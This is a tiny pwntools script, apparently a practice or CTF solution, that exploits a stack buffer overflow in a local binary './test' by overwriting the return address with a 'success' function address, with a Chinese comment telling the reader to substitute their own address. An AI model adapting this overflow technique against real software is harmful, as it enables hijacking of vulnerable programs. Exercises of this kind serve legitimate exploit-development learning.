from pwn import *

p = process('./test')

# 换成你自己的 success 地址
success_addr = 0x8049186

payload = b'A' * 32 + p32(success_addr)

p.sendline(payload)
p.interactive()
